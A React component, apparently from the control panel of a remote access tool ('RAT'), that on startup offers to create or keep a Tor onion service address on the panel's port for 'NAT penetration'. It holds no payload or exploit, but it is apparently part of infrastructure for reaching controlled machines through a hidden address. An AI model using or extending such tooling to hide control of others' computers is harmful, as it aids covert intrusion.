import React, { useEffect, useState, useContext } from "react";
import { createOnionCmd, initTorCmd } from "../rat/RATCommands";
import { OnionServiceInfo } from "../types";
import { IconWifi, IconCloudPlus, IconCheck } from "@tabler/icons-react";
import { RATContext } from "../rat/RATContext";

export const TorStartupModal: React.FC = () => {
  const { port } = useContext(RATContext)!;
  const [show, setShow] = useState(false);
  const [onionServices, setOnionServices] = useState<OnionServiceInfo[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const checkTor = async () => {
      try {
        const services = await initTorCmd();
        setOnionServices(services);
        setShow(true); // User wants to be asked on every startup
      } catch (e) {
        console.error("Failed to init Tor", e);
      }
    };
    checkTor();
  }, []);

  const handleCreateNew = async () => {
    const parsedPort = parseInt(port, 10);
    if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
      console.error("Invalid server port for onion creation");
      return;
    }

    setLoading(true);
    try {
      await createOnionCmd(`onion-${Date.now()}`, parsedPort);
      setShow(false);
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  const handleKeep = () => {
    setShow(false);
  };

  if (!show) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm">
      <div className="bg-secondarybg border border-accentx rounded-2xl p-8 max-w-md w-full shadow-2xl">
        <div className="flex items-center space-x-3 mb-6">
          <div className="p-3 bg-purple-700 rounded-xl">
            <IconWifi size={24} className="text-white" />
          </div>
          <h2 className="text-2xl font-bold text-white">Tor Onion Service</h2>
        </div>

        <p className="text-gray-300 mb-8 text-lg">
          Would you like to generate a new Onion Service address for NAT penetration, or keep using an existing one?
        </p>

        <div className="space-y-4">
          <button
            onClick={handleCreateNew}
            disabled={loading}
            className="w-full flex items-center justify-center space-x-2 bg-blue-700 hover:bg-blue-600 text-white font-semibold py-4 rounded-xl transition-all disabled:opacity-50"
          >
            <IconCloudPlus size={20} />
            <span>{loading ? "Generating..." : "Generate New Address"}</span>
          </button>

          {onionServices.length > 0 && (
            <button
              onClick={handleKeep}
              className="w-full flex items-center justify-center space-x-2 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-4 rounded-xl transition-all"
            >
              <IconCheck size={20} />
              <span>Keep Existing Address</span>
            </button>
          )}
        </div>
      </div>
    </div>
  );
};
